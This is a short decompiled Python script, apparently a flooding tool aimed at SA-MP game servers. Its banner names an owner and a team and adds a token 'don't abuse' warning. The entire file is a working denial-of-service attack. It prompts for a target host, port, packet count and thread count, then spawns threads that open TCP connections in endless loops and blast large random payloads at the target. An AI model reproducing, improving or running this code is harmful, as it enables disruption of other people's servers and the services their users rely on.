# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-05-04 08:22:47.443940
import socket
import random
import threading

print("""
 
>>>>>>>>OWNER L3XSH1N:SAMP
>>>>>>>>>> Please Don't you abuse Tool
>>>>>>>>>>>> TOOL FOR SAMP VERSION 5
>>>>>>>>>>>>>> Team RELAXCREW | RELAXCREW STR
>>>>>>>>>>>>>>> Enjoy but!!! Don't abuse
""")

ip = str(input('H05t: '))
port = int(input('P06t: '))
pack = int(input('P4ke7tan: '))
thread = int(input('TimeOut: '))
print("Run!!!!!!!!!!")

def start():
    hh = random._urandom(200000)
    xx = int(0)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(hh)
            for i in range(pack):
                s.send(hh)
            xx += 1
            print(" Exit ")
        except:    
            s.close()
            print(" S3NT T0 1P 4N6 P09T ")

for x in range(thread):
    thred = threading.Thread(target=start)
    thred.start()
